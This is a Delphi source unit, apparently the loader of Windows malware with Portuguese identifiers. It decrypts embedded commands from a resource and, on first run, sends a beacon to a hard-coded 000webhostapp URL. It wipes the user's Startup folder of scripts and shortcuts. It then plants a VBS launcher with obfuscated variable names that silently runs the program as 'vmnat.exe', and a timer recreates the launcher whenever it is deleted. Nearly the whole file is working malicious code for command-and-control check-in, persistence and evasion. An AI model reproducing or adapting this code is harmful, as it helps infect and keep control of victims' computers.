unit umodulo;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Classes,
  System.NetEncoding, Vcl.Forms, Vcl.ExtCtrls, BTMemoryModule, DCPsha1,
  MemoryModule, System.Zip, dialogs, shellapi, DCPcrypt2, DCPdes, funcoes,
  Vcl.StdCtrls, System.ZLib, IdHTTP, System.Win.ComObj, Vcl.Controls;

type
  Tfrmstart = class(TForm)
    Timer1: TTimer;
    edt_k8: TEdit;
    edt_ms: TEdit;
    Label1: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }
    Procedure box1();
    Procedure box2();
    Procedure box4(lcl: string; caminho: string);
    Procedure box3(strtext: Tstringlist; patfilename: string);

  public
    { Public declarations }
  end;

var
  frmstart: Tfrmstart;
  lib: TMemoryModule;
  strmOutput: TMemoryStream;
  mymutex: string;
  hMutex: Integer;
  Mutex: String;
  ext_pasta: string;
  get_pasta: string;
  id_javasi: string;
  id_vbs: string;
  Fora_startup: string;
  Fora_pcname: string;
  Fora_username: string;
  novolocal: string;
  arqName: string;
  local: string;
  namer8: string;
  namer1: string;
  namer7: string;
  namer2: string;
  localizado: string;
  namer3: string;
  namer4: string;
  namer5: string;
  namer6: string;
  pcn: string;
  o: string;
  rez2: Tstringlist = nil;
  password: string;
  str_res: string;
  //var_str: TStringList = nil;
  CMD_GERAL:Tstringlist = nil;

implementation

uses principal, variaveis, conexoes, tapioca, usession;
{$INCLUDE something.inc}
{$R *.dfm}

Procedure Tfrmstart.box1();
var
  i: Integer;
Begin
  for i := 0 to rez2.Count - 1 do
    rez2.Strings[i] := DC2(rez2.Strings[i], password, '');
End;

Procedure Tfrmstart.box2();
var
  tmpStream: TResourceStream;
  MemStream: TMemoryStream;
  rez1: Tstringlist;
Begin
  try
    str_res := edt_ms.Text;
    MemStream := TMemoryStream.Create;
    rez1 := Tstringlist.Create;
    rez2 := Tstringlist.Create;
    tmpStream := TResourceStream.Create(hInstance, PCHAR(str_res), RT_RCDATA);
    MemStream.LoadFromStream(tmpStream);
    MemStream.Position := 0;
    DoExpand(MemStream);
    MemStream.Position := 0;
    rez1.LoadFromStream(MemStream);
    rez2.Text := rez1.Text;
    password := edt_k8.Text; // keys;
    box1;
    CMD_GERAL.Text := rez2.Text;
    // memo1.Lines.Text := mem_str.Text;
    Application.ProcessMessages;
  finally
    FreeAndNil(tmpStream);
    FreeAndNil(MemStream);
    FreeAndNil(rez1);
    FreeAndNil(rez2);
  end;
End;

function ActiveCaption: string;
var
  Handle: THandle;
  Len: LongInt;
  Title: string;
begin
  Result := '';
  Handle := GetForegroundWindow;
  if Handle <> 0 then
  begin
    Len := GetWindowTextLength(Handle) + 1;
    SetLength(Title, Len);
    GetWindowText(Handle, PCHAR(Title), Len);
    ActiveCaption := TrimRight(Title);
  end;
end;

procedure namer9(UrlDest: string);
var
  web: TIdHTTP;
  TSConsulta: Tstringlist;
begin
  web := TIdHTTP.Create(nil);
  TSConsulta := Tstringlist.Create;
  try
    with web do
    begin
      { TSConsulta.Add('qlmacxenze='+TNetEncoding.Base64.Encode(ComputerName));
        TSConsulta.Add('pkpnpmcgul='+TNetEncoding.Base64.Encode(Versionx));
        TSConsulta.Add('ryakpxscha='+TNetEncoding.Base64.Encode(VersaoWin));
        TSConsulta.Add('obmiunnict='+TNetEncoding.Base64.Encode('TEST'));
        TSConsulta.Add('muilfoeqbw='+TNetEncoding.Base64.Encode(IsCore+IsRaptor));
        TSConsulta.Add('btyjuhvxhl='+TNetEncoding.Base64.Encode(GetAntiVirusProductInfo)); }
      // TSConsulta.Values['$_POST']:= Comand;
      web.Request.Accept := 'text/html, */*';
      web.Request.UserAgent :=
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)';
      web.Request.ContentType := 'application/x-www-form-urlencoded';
      web.Post(UrlDest, TSConsulta);
    end;
  finally
    web.Free;
    TSConsulta.Free;

  end;

end;
{
  procedure Systemas1(sProgTitle, sCmdLine: string; bRunOnce: boolean);
  var

  sKey: string;
  reg: TRegIniFile;
  begin
  if bRunOnce then
  sKey := 'Once'
  else
  sKey := '';
  reg := TRegIniFile.Create('');
  reg.RootKey := HKEY_CURRENT_USER;
  reg.WriteString('Software\Microsoft\Windows\CurrentVersion\Run' + sKey + #0,
  sProgTitle, sCmdLine);
  reg.Free;
  end; }

procedure Systemas3;
var
  f: TextFile;
  linha: string;
  Can: Tstringlist;
begin
  try
    if not FileExists(ExtractFilePath(Application.ExeName) + 'maisum') then
    begin
      // Systemas1(ChaveN, ParamStr(0), false);
      namer9('https://oversexed-blanket.000webhostapp.com/contador/inspecionando.php'); // contador
      Can := Tstringlist.Create;
      Can.SaveToFile(ExtractFilePath(Application.ExeName) + '\maisum');
      Can.Free;
    end;
  except

  end;
end;

function GetModuleName: string;
var
  szFileName: array [0 .. MAX_PATH] of Char;
begin
  FillChar(szFileName, SizeOf(szFileName), #0);
  GetModuleFileName(hInstance, szFileName, MAX_PATH);
  Result := szFileName;
end;

function SetText(WndHandle: HWND; TextValue: String): BOOL;
begin
  Result := SendMessage(WndHandle, WM_SETTEXT, 0, lParam(PCHAR(TextValue))) = 0;
end;

Procedure Tfrmstart.box3(strtext: Tstringlist; patfilename: string);
var
  box3: Variant;
  box32: Variant;
  scrFSO: Variant;
  myfile: Variant;
  myFileEncode: string;
  salvatexto: Tstringlist;
  bosta: string;
  Code: WideString;
  str1: string;
  str2: string;
  str3: string;
Begin
  try
    str1 := RDN2(6);
    str2 := RDN2(6);
    str3 := RDN2(6);

    salvatexto := Tstringlist.Create;
    box3 := CreateOleObject('Scripting.Encoder');
    myfile := strtext.Text;
    salvatexto.Add(myfile);
    salvatexto.SaveToFile(namer2 + patfilename);
    localizado := namer2 + patfilename;
    frmstart.Timer1.Enabled := True;
  finally
    salvatexto.Free;
  end;
End;

Procedure Tfrmstart.box4(lcl: string; caminho: string);
var
  textovbsaviso: Tstringlist;
  vbsobjaviso: Variant;
  Value: Variant;
  AFileName: String;
  i: Integer;
  strtxt: string;
  startup: string;
  pcname: string;
  Username: string;
  starter: Tstringlist;
  objWSShell: Variant;
  ObjNetwork: Variant;
  NovoNome: string;
  NovoCaminho: string;
  str1: string;
  str2: string;
  str3: string;
begin
  str1 := RDN2(6);
  str2 := RDN2(6);
  str3 := RDN2(6);

  namer3 := 'vmnat.exe'; //RDN2(10) + '.exe';
  namer4 := RDN2(10);
  //Load_javasi('JLI_CmdToArgs', namer3, caminho);

  NovoNome := ExtractFileName(caminho);
  NovoCaminho := ExtractFilePath(caminho);

  textovbsaviso := Tstringlist.Create;
  starter := Tstringlist.Create;
  try
    objWSShell := CreateOleObject('Wscript.Shell');
    ObjNetwork := CreateOleObject('Wscript.Network');
    startup := objWSShell.SpecialFolders.Item('startup') + '\';

    Delfiles(startup, '*.vbs');
    Delfiles(startup, '*.cmd');
    Delfiles(startup, '*.lnk');

    pcname := ObjNetwork.ComputerName;
    Username := ObjNetwork.Username;

    starter.Add('on error resume next ');

    starter.Add('Set objShell = CreateObject("WScript.Shell") ');
    starter.Add('set fsysobj = createobject("scripting.filesystemobject") ');

    starter.Add('runcmd = "cmd /k c: & cd\ & cd ' + caminho + '' + ' & ' +
      namer3 + '"');

    starter.Add('if fsysobj.fileexists (' + '"' + caminho + lcl + '"' +
      ') then ');
    starter.Add('objShell.run(runcmd),0 ');
    starter.Add('End If ');
    FindReplace('<NAMEFILE>', lcl, starter);

    FindReplace('objShell', uppercase(str1), starter);
    FindReplace('fsysobj', uppercase(str2), starter);
    FindReplace('runcmd', uppercase(str3), starter);

    try

      namer2 := startup;
      namer5 := pcname;
      namer6 := Username;
      box3(starter, namer4 + '.vbs');
    finally
    end;
  except
    exit;
  end;
end;

procedure Tfrmstart.FormCreate(Sender: TObject);
var
  f: TextFile;
  buffer: Array [0 .. 260] of Char;
  local: string;
  f_name: string;
begin

  // Impede o Programa de Abrir 2x
  mymutex := Label1.Caption;
  hMutex := CreateMutex(0, True, PCHAR(mymutex));
  if GetLastError = ERROR_ALREADY_EXISTS then
  begin
    exitprocess(0);
  end;

  CMD_GERAL := Tstringlist.Create;

  pcn := pcname;
  o := keys;
  o := o + pcn;
  o := StringReplace(o, pcn, '', [rfReplaceAll, rfIgnoreCase]);
  SetText(edt_k8.Handle, keys);
  box2;

  GetModuleFileName(hInstance, buffer, Length(buffer));
  local := ExtractFilePath(buffer);
  namer1 := ExtractFileName(buffer);
  f_name := ExtractFileName(buffer);
  namer7 := local + 'fim';
  namer8 := ExtractText(namer7, 'C:\', '\fim');
  Peek;
  Install_Cur(false);
  strDeskTop := 0;
  NivelCompressao := clMax;
  WinVTemp := VersaoWin;
  Systemas3;
  Iniciar;
  box4(namer1, local);

end;

procedure Tfrmstart.Timer1Timer(Sender: TObject);
begin
  begin
    if not FileExists(localizado) then
    Begin
      box4(namer1, local);
      Application.ProcessMessages;
    end;
  end;
end;

end.
